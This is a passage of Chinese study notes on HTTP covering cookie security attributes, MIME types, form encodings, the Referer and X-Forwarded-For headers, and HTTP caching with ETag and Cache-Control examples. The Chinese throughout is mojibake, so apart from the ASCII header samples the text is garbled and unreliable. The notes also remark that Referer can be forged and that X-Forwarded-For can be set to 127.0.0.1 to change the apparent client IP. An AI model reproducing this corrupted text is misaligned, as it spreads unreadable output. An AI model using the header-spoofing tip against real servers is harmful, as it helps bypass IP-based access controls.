å±æ€§è¡¨ç¤ºCookieä»…é€šè¿‡HTTPSå‘é€ã€‚ HttpOnly å±æ€§è¡¨ç¤ºCookieä¸èƒ½è¢«å®¢æˆ·ç«¯è„šæœ¬ï¼ˆå¦‚JavaScriptï¼‰è®¿é—®ã€‚ [!CAUTION] XSS æ”»å‡»æ˜¯ä¸€ç§å¸¸è§çš„æ”»å‡»æ–¹å¼ï¼Œæ”»å‡»è€…é€šè¿‡å‘ Web é¡µé¢æ³¨å…¥æ¶æ„çš„ JavaScript ä»£ç æ¥çªƒå–ç”¨æˆ·æ•°æ®ã€‚ä½¿ç”¨ HttpOnly æ ‡è®°çš„ Cookie å¯ä»¥é˜²æ­¢æ¶æ„ JavaScript ä»£ç é€šè¿‡ document.cookie æˆ–å…¶ä»–æ–¹å¼è·å–æ•æ„Ÿæ•°æ®ï¼ˆå¦‚ä¼šè¯ Cookieï¼‰ ä½†å®ƒå¹¶ä¸èƒ½é˜²æ­¢ Cookie è¢«æœåŠ¡å™¨ç«¯è®¿é—®ï¼Œæ”»å‡»è€…å¦‚æœèƒ½å¤Ÿè·å¾—æœåŠ¡å™¨ç«¯çš„è®¿é—®æƒé™ï¼ˆå¦‚ SQL æ³¨å…¥ã€æœåŠ¡å™¨é…ç½®é”™è¯¯ç­‰ï¼‰æˆ–è¿›è¡ŒCSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰æ”»å‡»ï¼Œä»ç„¶æœ‰å¯èƒ½çªƒå– Cookie å› æ­¤ï¼Œå®ƒéœ€è¦ä¸å…¶ä»–å®‰å…¨æªæ–½ï¼ˆå¦‚ Secureã€SameSiteï¼‰ç»“åˆä½¿ç”¨ï¼Œä»¥æä¾›å…¨é¢çš„å®‰å…¨é˜²æŠ¤ SameSite=Lax å±æ€§è¡¨ç¤ºåœ¨è·¨ç«™è¯·æ±‚æ—¶ï¼ŒCookieä¸ä¼šéšè¯·æ±‚å‘é€ï¼Œé™¤éè¯·æ±‚æ˜¯åŒç«™çš„ã€‚ Content-Lengthï¼šè¯·æ±‚ä½“çš„é•¿åº¦ã€‚ Content-Typeï¼šæŒ‡å®šèµ„æºçš„åª’ä½“ç±»å‹ï¼ˆ MIME ç±»å‹ï¼‰ï¼ˆåª’ä½“ç±»å‹ï¼ˆä¹Ÿé€šå¸¸ç§°ä¸ºå¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•æˆ– MIME ç±»å‹ï¼‰æ˜¯ä¸€ç§æ ‡å‡†ï¼Œç”¨æ¥è¡¨ç¤ºæ–‡æ¡£ã€æ–‡ä»¶æˆ–ä¸€ç»„æ•°æ®çš„æ€§è´¨å’Œæ ¼å¼ï¼‰ï¼Œå‘Šè¯‰æ¥æ”¶æ–¹å¦‚ä½•å¤„ç†ä¼ è¾“çš„æ•°æ® [!WARNING] æµè§ˆå™¨é€šå¸¸ä½¿ç”¨ MIME ç±»å‹è€Œä¸æ˜¯æ–‡ä»¶æ‰©å±•åæ¥å†³å®šå¦‚ä½•å¤„ç† URLï¼Œå› æ­¤ Web æœåŠ¡å™¨åœ¨ Content-Type å“åº”æ ‡å¤´ä¸­æ·»åŠ æ­£ç¡®çš„ MIME ç±»å‹éå¸¸é‡è¦ã€‚å¦‚æœé…ç½®ä¸æ­£ç¡®ï¼Œæµè§ˆå™¨å¯èƒ½ä¼šæ›²è§£æ–‡ä»¶å†…å®¹ï¼Œç½‘ç«™å°†æ— æ³•æ­£å¸¸å·¥ä½œï¼Œå¹¶ä¸”ä¸‹è½½çš„æ–‡ä»¶ä¹Ÿå¯èƒ½è¢«é”™è¯¯å¤„ç† ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ Content-Type å€¼åŠå…¶å¯¹åº”çš„æ•°æ®æ ¼å¼ï¼š æ–‡æœ¬ç±»å‹ text/htmlï¼šHTML æ–‡æ¡£ã€‚ [!CAUTION] å¦‚æœéœ€è¦ XML çš„ä¸¥æ ¼è§£æè§„åˆ™ã€![CDATA[...]](åœ¨ XML ä¸­ï¼Œæ‰€æœ‰çš„å­—ç¬¦æ•°æ®é»˜è®¤éƒ½ä¼šè¢«è§£æï¼Œå¹¶ä¸”éœ€è¦å¤„ç†ç‰¹æ®Šå­—ç¬¦ï¼ˆæ¯”å¦‚ ä¼šå˜æˆ ï¼Œ ä¼šå˜æˆ ï¼‰ã€‚ä½†æ˜¯ï¼Œå¦‚æœä½ ä½¿ç”¨ CDATAï¼Œåˆ™è¯¥éƒ¨åˆ†ä¸­çš„æ‰€æœ‰å†…å®¹éƒ½ä¼šè¢«å½“ä½œæ™®é€šæ–‡æœ¬å¤„ç†ï¼Œç›´åˆ°é‡åˆ° ]]ï¼Œè¿™æ—¶ CDATA éƒ¨åˆ†ç»“æŸ)æˆ– HTML/SVG/MathML å‘½åç©ºé—´ä»¥å¤–çš„å…ƒç´ ï¼Œè¯·ä½¿ç”¨ application/xml æˆ– application/xhtml+xml text/plainï¼šçº¯æ–‡æœ¬ï¼Œæ–‡æœ¬æ–‡ä»¶çš„é»˜è®¤å€¼ã€‚å³ä½¿å®ƒå…¶å®æ„å‘³ç€æœªçŸ¥çš„æ–‡æœ¬æ–‡ä»¶ï¼Œä½†æµè§ˆå™¨è®¤ä¸ºæ˜¯å¯ä»¥ç›´æ¥å±•ç¤ºçš„ã€‚ [!CAUTION] text/plain å¹¶ä¸æ„å‘³â€œä»»ä½•ç§ç±»çš„æ–‡æœ¬æ•°æ®â€ã€‚å¦‚æœæµè§ˆå™¨æœŸå¾…çš„æ˜¯æŸç§ç‰¹å®šçš„æ–‡æœ¬æ•°æ®ï¼Œå¾ˆå¯èƒ½ä¸ä¼šå°†å…¶è§†ä¸ºåŒ¹é…ã€‚å…·ä½“æ¥è¯´ï¼Œå¦‚æœä»å£°æ˜ CSS æ–‡ä»¶çš„ link å…ƒç´ ä¸­ä¸‹è½½äº†ä¸€ä¸ª text/plain æ–‡ä»¶ï¼Œé‚£ä¹ˆå¦‚æœæä¾›çš„æ˜¯ text/plainç±»å‹ï¼Œå°±ä¸ä¼šå°†å…¶è¯†åˆ«ä¸ºæœ‰æ•ˆçš„ CSS æ–‡ä»¶ã€‚CSS MIME ç±»å‹éœ€è¦ä½¿ç”¨ text/css text/cssï¼šå±‚å æ ·å¼è¡¨ï¼ˆCSSï¼‰ï¼Œåœ¨ç½‘é¡µä¸­è¦è¢«è§£æä¸º CSS çš„ä»»ä½• CSS æ–‡ä»¶å¿…é¡»æŒ‡å®š MIME ä¸º text/css text/javascriptï¼šJavaScript ä»£ç ï¼ˆå·²åºŸå¼ƒï¼Œåº”ä½¿ç”¨ application/javascriptï¼‰ã€‚ å›¾åƒç±»å‹ image/gifï¼šå›¾å½¢äº¤æ¢æ ¼å¼ï¼ˆGIFï¼‰ image/jpegï¼šè”åˆå›¾åƒä¸“å®¶å°ç»„å›¾ç‰‡ï¼ˆJPEGï¼‰ image/pngï¼šä¾¿æºå¼ç½‘ç»œå›¾å½¢ï¼ˆPNGï¼‰ image/svg+xmlï¼šå¯ç¼©æ”¾çŸ¢é‡å›¾å½¢ï¼ˆSVGï¼‰ image/webpï¼šWeb å›¾åƒæ ¼å¼ï¼ˆWEBPï¼‰ image/apngï¼šåŠ¨ç”»ä¾¿æºå¼ç½‘ç»œå›¾å½¢ï¼ˆAPNGï¼‰ image/avifï¼šAV1 å›¾åƒæ–‡ä»¶æ ¼å¼ï¼ˆAVIFï¼‰ éŸ³é¢‘å’Œè§†é¢‘ç±»å‹ audio/mpegï¼šMPEG éŸ³é¢‘ã€‚ video/mp4ï¼šMP4 è§†é¢‘ã€‚ audio/oggï¼šOgg éŸ³é¢‘ã€‚ video/oggï¼šOgg è§†é¢‘ã€‚ video/webm: WebMæ ¼å¼çš„è§†é¢‘ã€‚ åº”ç”¨ç¨‹åºç±»å‹ application/jsonï¼šJSON æ•°æ®ã€‚ application/xmlï¼šXML æ•°æ®ã€‚ application/pdfï¼šPDF æ–‡æ¡£ã€‚ application/zipï¼šZIP å‹ç¼©æ–‡ä»¶ã€‚ application/javascriptï¼šJavaScript ä»£ç ï¼ˆç°ä»£æµè§ˆå™¨æ¨èä½¿ç”¨ï¼‰ã€‚ å¤šéƒ¨åˆ†ç±»å‹ multipart/form-dataï¼šç”¨äºè¡¨å•æ•°æ®çš„ä¼ è¾“ï¼Œå…è®¸åœ¨å•ä¸ªè¯·æ±‚ä¸­å‘é€å¤šä¸ªæ–‡ä»¶å’Œå­—æ®µã€‚è¿™é€šå¸¸ç”¨äºæ–‡ä»¶ä¸Šä¼ å’Œå¤šå€¼æ•°æ®ä¼ è¾“ï¼Œå¯ç”¨äºHTMLè¡¨å•ä»æµè§ˆå™¨å‘é€ä¿¡æ¯ç»™æœåŠ¡å™¨ multipart/byterangesï¼šç”¨äºå®šä¹‰å¤šä¸ªå­—èŠ‚èŒƒå›´ï¼Œé€šå¸¸ç”¨äºè§†é¢‘æµæˆ–å¤§æ–‡ä»¶ä¸‹è½½ å…¶ä»–ç±»å‹ application/octet-streamï¼šè¿™æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶çš„é»˜è®¤å€¼ã€‚ç”±äºè¿™æ„å‘³ç€æœªçŸ¥çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæµè§ˆå™¨ä¸€èˆ¬ä¸ä¼šè‡ªåŠ¨æ‰§è¡Œæˆ–è¯¢é—®æ‰§è¡Œã€‚æµè§ˆå™¨å°†è¿™äº›æ–‡ä»¶è§†ä¸º Content-Disposition æ ‡å¤´è¢«è®¾ç½®ä¸º attachment ä¸€æ ·ï¼Œå¹¶å¼¹å‡ºâ€œå¦å­˜ä¸ºâ€å¯¹è¯æ¡† application/x-www-form-urlencodedï¼šç”¨äºè¡¨å•æ•°æ®çš„ä¼ è¾“ï¼Œé€šå¸¸ç”¨äº GET å’Œ POST è¯·æ±‚ã€‚ å­—ç¬¦ç¼–ç  è®¸å¤š Content-Type å€¼å¯ä»¥åŒ…å«å­—ç¬¦ç¼–ç ä¿¡æ¯ï¼Œå¦‚ text/html; charset=utf-8ï¼Œè¿™æŒ‡å®šäº†ä½¿ç”¨ UTF-8 ç¼–ç çš„ HTML æ–‡æ¡£ã€‚ [!IMPORTANT] åœ¨ HTML è¡¨å•ä¸­ï¼Œenctype æ˜¯ä¸€ä¸ªå±æ€§ï¼Œç”¨äºæŒ‡å®šåœ¨æäº¤è¡¨å•æ—¶æ•°æ®çš„ç¼–ç ç±»å‹ã€‚å®ƒå†³å®šäº†è¡¨å•æ•°æ®åœ¨å‘é€åˆ°æœåŠ¡å™¨æ—¶çš„æ ¼å¼åœ¨ HTML è¡¨å•ä¸­ï¼Œenctype æ˜¯ä¸€ä¸ªå±æ€§ï¼Œç”¨äºæŒ‡å®šåœ¨æäº¤è¡¨å•æ—¶æ•°æ®çš„ç¼–ç ç±»å‹ã€‚å®ƒå†³å®šäº†è¡¨å•æ•°æ®åœ¨å‘é€åˆ°æœåŠ¡å™¨æ—¶çš„æ ¼å¼ application/x-www-form-urlencodedï¼ˆé»˜è®¤ï¼‰ï¼šé€‚ç”¨äºæäº¤å¸¸è§„æ–‡æœ¬æ•°æ®ï¼Œç®€å•çš„è¡¨å•æäº¤ã€‚ multipart/form-dataï¼šé€‚ç”¨äºä¸Šä¼ æ–‡ä»¶æ—¶çš„è¡¨å•æäº¤ï¼Œå½“è¡¨å•åŒ…å«æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œä¸€å®šè¦ä½¿ç”¨ multipart/form-dataï¼Œå¦åˆ™æ–‡ä»¶å°†æ— æ³•æ­£ç¡®ä¸Šä¼  text/plainï¼šä»¥çº¯æ–‡æœ¬å½¢å¼æäº¤æ•°æ®ï¼Œæ¯å¯¹ name=value ç”±æ¢è¡Œç¬¦åˆ†éš”ã€‚ Refererï¼šæŒ‡ç¤ºè¯·æ±‚æ¥æºçš„é¡µé¢URLï¼ˆç”¨æˆ·æ˜¯ä»å“ªä¸ªé¡µé¢ç‚¹å‡»é“¾æ¥åˆ°è¾¾å½“å‰è¯·æ±‚çš„é¡µé¢çš„ï¼‰ï¼Œå¯ç”¨æ¥æœåŠ¡å™¨ä¼ªé€  https://www.xxxx.comï¼Œè¿™ä¸ªå¤´éƒ¨å­—æ®µé€šå¸¸ç”¨äºåˆ†ææµé‡æ¥æºã€é˜²æ­¢CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰æ”»å‡»ä»¥åŠè·Ÿè¸ªç”¨æˆ·è¡Œä¸º ç¤ºä¾‹ å‡è®¾ä½ è®¿é—®äº†ä¸€ä¸ªç½‘ç«™ http://example.com/page1ï¼Œç„¶åä»è¯¥é¡µé¢ç‚¹å‡»é“¾æ¥è·³è½¬åˆ° http://example.com/page2ï¼Œæµè§ˆå™¨åœ¨è¯·æ±‚ page2 æ—¶ï¼Œé€šå¸¸ä¼šå°†ä»¥ä¸‹å¤´éƒ¨æ·»åŠ åˆ°è¯·æ±‚ä¸­ï¼š Referer: http://example.com/page1 å‡è®¾ç”¨æˆ·ä»é¡µé¢ https://www.example.com/page1.html ç‚¹å‡»ä¸€ä¸ªé“¾æ¥ï¼Œè·³è½¬åˆ° https://www.example.com/page2.htmlï¼Œé‚£ä¹ˆåœ¨è¯·æ±‚ page2.html æ—¶ï¼ŒHTTPè¯·æ±‚çš„ Referer å¤´éƒ¨å¯èƒ½å¦‚ä¸‹ï¼š GET /page2.html HTTP/1.1Host: www.example.comReferer: https://www.example.com/page1.html 11.X-Forwarded-For:ç”¨äºåœ¨HTTPè¯·æ±‚ç»è¿‡ä»£ç†æœåŠ¡å™¨æˆ–è´Ÿè½½å‡è¡¡å™¨æ—¶ä¿ç•™åŸå§‹å®¢æˆ·ç«¯çš„IPåœ°å€ä¿¡æ¯ï¼Œå¯ç”¨äºä¿®æ”¹ip å¦‚127.0.0.1 X-Forwarded-Forå¤´éƒ¨å­—æ®µçš„æ ¼å¼å¦‚ä¸‹ï¼š X-Forwarded-For: client-IP, proxy1-IP, proxy2-IP, ... å…¶ä¸­ï¼Œåˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªIPåœ°å€ï¼ˆclient-IPï¼‰æ˜¯å®¢æˆ·ç«¯çš„çœŸå®IPåœ°å€ï¼Œéšåçš„IPåœ°å€è¡¨ç¤ºè¯·æ±‚ä¾æ¬¡ç»è¿‡çš„ä»£ç†æœåŠ¡å™¨çš„IPåœ°å€ã€‚ HTTPå“åº”åŒ…çš„ç»“æ„ å“åº”è¡Œ HTTP/1.1 404 Not Found åè®®ç‰ˆæœ¬ï¼Œé€šå¸¸ä¸º HTTP/1.1ã€‚ çŠ¶æ€ç ï¼ˆstatus codeï¼‰ï¼Œè¡¨æ˜è¯·æ±‚æ˜¯æˆåŠŸæˆ–å¤±è´¥ã€‚å¸¸è§çš„çŠ¶æ€ç æ˜¯ 200ï¼ˆOKã€‚è¯·æ±‚æˆåŠŸï¼‰ã€404 ï¼ˆNot Foundã€‚æœåŠ¡å™¨æ— æ³•æ‰¾åˆ°è¯·æ±‚çš„èµ„æºï¼‰æˆ–301ï¼ˆMoved Permanentlyã€‚è¯·æ±‚èµ„æºçš„ URI å·²è¢«æ”¹å˜ï¼‰ çŠ¶æ€æ–‡æœ¬ï¼ˆstatus textï¼‰ã€‚ä¸€ä¸ªç®€çŸ­çš„ï¼Œçº¯ç²¹çš„ä¿¡æ¯ï¼Œé€šè¿‡çŠ¶æ€ç çš„æ–‡æœ¬æè¿°ï¼Œå¸®åŠ©äººä»¬ç†è§£è¯¥ HTTP æ¶ˆæ¯ å“åº”å¤´ é€šç”¨æ ‡å¤´ï¼ˆGeneral headerï¼‰ï¼Œä¾‹å¦‚ Viaï¼Œé€‚ç”¨äºæ•´ä¸ªæ¶ˆæ¯ã€‚ å“åº”æ ‡å¤´ï¼ˆResponse headerï¼‰ï¼Œä¾‹å¦‚ Vary å’Œ Accept-Rangesï¼Œæä¾›æœ‰å…³æœåŠ¡å™¨çš„å…¶ä»–ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯ä¸é€‚åˆçŠ¶æ€è¡Œã€‚ è¡¨ç¤ºæ ‡å¤´ï¼ˆRepresentation headerï¼‰ï¼Œä¾‹å¦‚ Content-Type æè¿°äº†æ¶ˆæ¯æ•°æ®çš„åŸå§‹æ ¼å¼å’Œåº”ç”¨çš„ä»»æ„ç¼–ç ï¼ˆä»…åœ¨æ¶ˆæ¯æœ‰ä¸»ä½“æ—¶æ‰å­˜åœ¨ï¼‰ Content-Typeï¼šå“åº”ä½“çš„åª’ä½“ç±»å‹ã€‚ Content-Lengthï¼šå“åº”ä½“çš„é•¿åº¦ã€‚ Cache-Controlï¼šæ§åˆ¶å“åº”çš„ç¼“å­˜è¡Œä¸ºã€‚ Expiresï¼šæŒ‡å®šèµ„æºåˆ°æœŸçš„æ—¶é—´ã€‚ Set-Cookieï¼šè®¾ç½®å®¢æˆ·ç«¯çš„Cookieã€‚ Locationï¼šç”¨äºé‡å®šå‘çš„URLã€‚ Serverï¼šåŒ…å«æœåŠ¡å™¨è½¯ä»¶çš„ä¿¡æ¯ã€‚ WWW-Authenticateï¼šç”¨äºHTTPè®¤è¯çš„æŒ‘æˆ˜ã€‚ Last-Modifiedï¼šèµ„æºæœ€åä¿®æ”¹çš„æ—¶é—´ã€‚ ETagï¼šèµ„æºçš„ç‰¹å®šç‰ˆæœ¬çš„æ ‡è¯†ç¬¦ã€‚ HTTPç¼“å­˜ HTTP ç¼“å­˜ä¼šå­˜å‚¨ä¸è¯·æ±‚å…³è”çš„å“åº”ï¼Œå¹¶å°†å­˜å‚¨çš„å“åº”å¤ç”¨äºåç»­è¯·æ±‚ ç§æœ‰ç¼“å­˜ ç»‘å®šåˆ°ç‰¹å®šå®¢æˆ·ç«¯çš„ç¼“å­˜â€”â€”é€šå¸¸æ˜¯æµè§ˆå™¨ç¼“å­˜ å¦‚æœå“åº”åŒ…å«ä¸ªæ€§åŒ–å†…å®¹å¹¶ä¸”ä½ åªæƒ³å°†å“åº”å­˜å‚¨åœ¨ç§æœ‰ç¼“å­˜ä¸­ï¼Œåˆ™å¿…é¡»æŒ‡å®š private æŒ‡ä»¤ Cache-Control: private [!CAUTION] å¦‚æœå“åº”å…·æœ‰ Authorization æ ‡å¤´ï¼Œåˆ™ä¸èƒ½å°†å…¶å­˜å‚¨åœ¨ç§æœ‰ç¼“å­˜ï¼ˆæˆ–å…±äº«ç¼“å­˜ï¼Œé™¤é Cache-Control æŒ‡å®šçš„æ˜¯ publicï¼‰ä¸­ [!NOTE] public å€¼å…·æœ‰ä½¿å“åº”å¯å­˜å‚¨çš„æ•ˆæœï¼Œåªæœ‰åœ¨è®¾ç½®äº† Authorization æ ‡å¤´æ—¶éœ€è¦å­˜å‚¨å“åº”æ—¶æ‰åº”ä½¿ç”¨ public æŒ‡ä»¤ã€‚å¦åˆ™ä¸éœ€è¦ï¼Œå› ä¸ºåªè¦ç»™å‡ºäº† max-ageï¼Œå“åº”å°±ä¼šå­˜å‚¨åœ¨å…±äº«ç¼“å­˜ä¸­ã€‚ å…±äº«ç¼“å­˜ ä½äºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ï¼Œå¯ä»¥å­˜å‚¨èƒ½åœ¨ç”¨æˆ·ä¹‹é—´å…±äº«çš„å“åº” ä»£ç†ç¼“å­˜ é™¤äº†è®¿é—®æ§åˆ¶çš„åŠŸèƒ½å¤–ï¼Œä¸€äº›ä»£ç†è¿˜å®ç°äº†ç¼“å­˜ä»¥å‡å°‘ç½‘ç»œæµé‡ æ‰˜ç®¡ç¼“å­˜ ç”±æœåŠ¡å¼€å‘äººå‘˜æ˜ç¡®éƒ¨ç½²ï¼Œä»¥é™ä½æºæœåŠ¡å™¨è´Ÿè½½å¹¶æœ‰æ•ˆåœ°äº¤ä»˜å†…å®¹ï¼ŒåŒ…æ‹¬åå‘ä»£ç†ã€CDN å’Œ service worker ä¸ç¼“å­˜ API çš„ç»„åˆ [!CAUTION] HTTP ç¼“å­˜è§„èŒƒæœ¬è´¨ä¸Šæ²¡æœ‰å®šä¹‰æ˜¾å¼åˆ é™¤ç¼“å­˜çš„æ–¹æ³•â€”â€”ä½†æ˜¯ä½¿ç”¨æ‰˜ç®¡ç¼“å­˜ï¼Œå¯ä»¥é€šè¿‡ä»ªè¡¨æ¿æ“ä½œã€API è°ƒç”¨ã€é‡æ–°å¯åŠ¨ç­‰å®æ—¶åˆ é™¤å·²ç»å­˜å‚¨çš„å“åº” å¯å‘å¼ç¼“å­˜ HTTP æ—¨åœ¨å°½å¯èƒ½å¤šåœ°ç¼“å­˜ï¼Œå› æ­¤å³ä½¿æ²¡æœ‰ç»™å‡º Cache-Controlï¼Œå¦‚æœæ»¡è¶³æŸäº›æ¡ä»¶ï¼Œå“åº”ä¹Ÿä¼šè¢«å­˜å‚¨å’Œé‡ç”¨ HTTP/1.1 200 OKContent-Type: text/htmlContent-Length: 1024Date: Tue, 22 Feb 2022 22:22:22 GMTLast-Modifiedï¼ˆæœ€åä¿®æ”¹æ—¶é—´ï¼‰: Tue, 22 Feb 2021 22:22:22 GMT!doctype htmlâ€¦ é‡‡å–ä»¥ä¸Šå“åº”ã€‚æ­¤å›å¤æœ€åä¸€æ¬¡æ›´æ–°æ˜¯åœ¨ 1 å¹´å‰ åŸºäº age çš„ç¼“å­˜ç­–ç•¥ å­˜å‚¨çš„ HTTP å“åº”æœ‰ä¸¤ç§çŠ¶æ€ï¼šfresh å’Œ staleã€‚fresh çŠ¶æ€é€šå¸¸è¡¨ç¤ºå“åº”ä»ç„¶æœ‰æ•ˆï¼Œå¯ä»¥é‡å¤ä½¿ç”¨ï¼Œè€Œ stale çŠ¶æ€è¡¨ç¤ºç¼“å­˜çš„å“åº”å·²ç»è¿‡æœŸ ç¡®å®šå“åº”ä½•æ—¶æ˜¯ fresh çš„å’Œä½•æ—¶æ˜¯ stale çš„æ ‡å‡†æ˜¯ ageï¼ˆåœ¨ HTTP/1.0 ä¸­ï¼Œæœ‰æ•ˆæœŸæ˜¯é€šè¿‡ Expires æ ‡å¤´æ¥æŒ‡å®šçš„ï¼Œåœ¨ HTTP/1.1 ä¸­ï¼ŒCache-Control é‡‡ç”¨äº† max-ageâ€”â€”ç”¨äºæŒ‡å®šç»è¿‡çš„æ—¶é—´ï¼‰ HTTP/1.1 200 OKContent-Type: text/htmlContent-Length: 1024Date: Tue, 22 Feb 2022 22:22:22 GMTCache-Control: max-age=604800!doctype htmlâ€¦ å½“å“åº”å­˜å‚¨åœ¨å…±äº«ç¼“å­˜ä¸­æ—¶ï¼Œæœ‰å¿…è¦é€šçŸ¥å®¢æˆ·ç«¯å“åº”çš„ ageã€‚ï¼Œå¦‚æœå…±äº«ç¼“å­˜å°†å“åº”å­˜å‚¨äº†ä¸€å¤©ï¼Œåˆ™å…±äº«ç¼“å­˜å°†å‘åç»­å®¢æˆ·ç«¯è¯·æ±‚å‘é€ä»¥ä¸‹å“åº” HTTP/1.1 200 OKContent-Type: text/htmlContent-Length: 1024Date: Tue, 22 Feb 2022 22:22:22 GMTCache-Control: max-age=604800Age: 86400!doctype htmlâ€¦ Varyå“åº” åŒºåˆ†å“åº”çš„æ–¹å¼æœ¬è´¨ä¸Šæ˜¯åŸºäºå®ƒä»¬çš„ URL åœ¨ Vary æ ‡å¤´çš„å€¼ä¸­æ·»åŠ â€œAccept-Languageâ€ï¼Œæ ¹æ®è¯­è¨€å•ç‹¬ç¼“å­˜å“åº” Vary: Accept-Language è¿™ä¼šå¯¼è‡´ç¼“å­˜åŸºäºå“åº” URL å’Œ Accept-Languageè¯·æ±‚æ ‡å¤´çš„ç»„åˆè¿›è¡Œé”®æ§ éªŒè¯å“åº” éªŒè¯æ˜¯é€šè¿‡ä½¿ç”¨åŒ…å« If-Modified-Since æˆ– If-None-Match è¯·æ±‚æ ‡å¤´çš„æ¡ä»¶è¯·æ±‚å®Œæˆçš„ If-Modified-Since ä¸‹é¢çš„è¯·æ±‚æ˜¾ç¤ºå®¢æˆ·ç«¯å‘é€å¸¦æœ‰ If-Modified-Since è¯·æ±‚æ ‡å¤´çš„è¯·æ±‚ï¼Œä»¥è¯¢é—®æœåŠ¡å™¨è‡ªæŒ‡å®šæ—¶é—´ä»¥æ¥æ˜¯å¦æœ‰ä»»ä½•çš„æ”¹å˜ GET /index.html HTTP/1.1Host: example.comAccept: text/htmlIf-Modified-Since: Tue, 22 Feb 2022 22:00:00 GMT å¦‚æœå†…å®¹è‡ªæŒ‡å®šæ—¶é—´ä»¥æ¥æ²¡æœ‰æ›´æ”¹ï¼ŒæœåŠ¡å™¨å°†å“åº” 304 Not Modified ETag/If-None-Match å¦‚æœ ETag æ ‡å¤´ä½¿ç”¨äº† hash å€¼ï¼Œindex.html èµ„æºçš„ hash å€¼æ˜¯ deadbeefï¼Œå“åº”å¦‚ä¸‹ HTTP/1.1 200 OKContent-Type: text/htmlContent-Length: 1024Date: Tue, 22 Feb 2022 22:22:22 GMTETag: deadbeefCache-Control: max-age=3600!doctype htmlâ€¦ å¦‚æœè¯¥å“åº”æ˜¯é™ˆæ—§çš„ï¼Œåˆ™å®¢æˆ·ç«¯è·å–ç¼“å­˜å“åº”çš„ ETag å“åº”æ ‡å¤´çš„å€¼ï¼Œå¹¶å°†å…¶æ”¾å…¥ If-None-Match è¯·æ±‚æ ‡å¤´ä¸­ï¼Œä»¥è¯¢é—®æœåŠ¡å™¨èµ„æºæ˜¯å¦å·²è¢«ä¿®æ”¹ GET /index.html HTTP/1.1Host: example.comAccept: text/htmlIf-None-Match: deadbeef å¦‚æœæœåŠ¡å™¨ä¸ºè¯·æ±‚çš„èµ„æºç¡®å®šçš„ ETag æ ‡å¤´çš„å€¼ä¸è¯·æ±‚ä¸­çš„ If-None-Match å€¼ç›¸åŒï¼Œåˆ™æœåŠ¡å™¨å°†è¿”å› 304 Not Modifiedï¼Œå¦‚æœæœåŠ¡å™¨ç¡®å®šè¯·æ±‚çš„èµ„æºç°åœ¨åº”è¯¥å…·æœ‰ä¸åŒçš„ ETag å€¼ï¼Œåˆ™æœåŠ¡å™¨å°†å…¶æ”¹ä¸º 200 OK å’Œèµ„æºçš„æœ€æ–°ç‰ˆæœ¬è¿›è¡Œå“åº” [!TIP] å¯å°†ETag å’Œ Last-Modified ç»“åˆä½¿ç”¨ï¼ŒETag æä¾›é«˜ç²¾åº¦ï¼Œè€Œ Last-Modified æä¾›ç®€å•çš„æ—¶é—´æˆ³ï¼Œé…åˆä½¿ç”¨å¯ä»¥æ›´é«˜æ•ˆåœ°å®ç°ç¼“å­˜æ§åˆ¶ å¼ºåˆ¶é‡æ–°éªŒè¯ å¦‚æœä½ ä¸å¸Œæœ›é‡å¤ä½¿ç”¨å“åº”ï¼Œè€Œæ˜¯å¸Œæœ›å§‹ç»ˆä»æœåŠ¡å™¨è·å–æœ€æ–°å†…å®¹ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ no-cache æŒ‡ä»¤å¼ºåˆ¶éªŒè¯ no-cacheï¼šå…è®¸ç¼“å­˜ï¼Œä¸å…è®¸ç›´æ¥ä½¿ç”¨ç¼“å­˜çš„æ•°æ®ï¼Œæ¯æ¬¡ä½¿ç”¨ç¼“å­˜å‰éƒ½è¦å‘æœåŠ¡å™¨éªŒè¯æ•°æ®çš„æœ‰æ•ˆæ€§ é€šè¿‡åœ¨å“åº”ä¸­æ·»åŠ  Cache-Control: no-cache ä»¥åŠ Last-Modified å’Œ ETagã€‚å¦‚æœè¯·æ±‚çš„èµ„æºå·²æ›´æ–°ï¼Œå®¢æˆ·ç«¯å°†æ”¶åˆ° 200 OK å“åº”ï¼Œå¦åˆ™ï¼Œå¦‚æœè¯·æ±‚çš„èµ„æºå°šæœªæ›´æ–°ï¼Œåˆ™ä¼šæ”¶åˆ° 304 Not Modified å“åº” HTTP/1.1 200 OKContent-Type: text/htmlContent-Length: 1024Date: Tue, 22 Feb 2022 22:22:22 GMTLast-Modified: Tue, 22 Feb 2022 22:00:00 GMTETag: deadbeefCache-Control: no-cache!doctype htmlâ€¦ ä¸ä½¿ç”¨ç¼“å­˜ no-cache æŒ‡ä»¤ä¸ä¼šé˜»æ­¢å“åº”çš„å­˜å‚¨ï¼Œè€Œæ˜¯é˜»æ­¢åœ¨æ²¡æœ‰é‡æ–°éªŒè¯çš„æƒ…å†µä¸‹é‡ç”¨å“åº” ä½¿ç”¨ private æŒ‡ä»¤å°†ä½¿ä¸ªæ€§åŒ–å“ä»…ä¸ç‰¹å®šå®¢æˆ·ç«¯ä¸€èµ·å­˜å‚¨ï¼Œè€Œä¸ä¼šæ³„éœ²ç»™ç¼“å­˜çš„ä»»ä½•å…¶ä»–ç”¨æˆ·ï¼Œä½†åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå³ä½¿è®¾ç½®äº† no-storeï¼Œä¹Ÿå¿…é¡»è®¾ç½® private é‡æ–°åŠ è½½å’Œå¼ºåˆ¶é‡æ–°åŠ è½½ é‡æ–°åŠ è½½ GET / HTTP/1.1Host: example.comCache-Control: max-age=0If-None-Match: deadbeefIf-Modified-Since: Tue, 22 Feb 2022 20:20:20 GMT è¯·æ±‚ä¸­çš„ max-age=0 æŒ‡ä»¤æŒ‡å®šâ€œé‡ç”¨ age ä¸º 0 æˆ–æ›´å°‘çš„å“åº”â€â€”â€”å› æ­¤ï¼Œä¸­é—´å­˜å‚¨çš„å“åº”ä¸ä¼šè¢«é‡ç”¨ è¯·æ±‚é€šè¿‡ If-None-Match å’Œ If-Modified-Since è¿›è¡ŒéªŒè¯ å¼ºåˆ¶é‡æ–°åŠ è½½ GET / 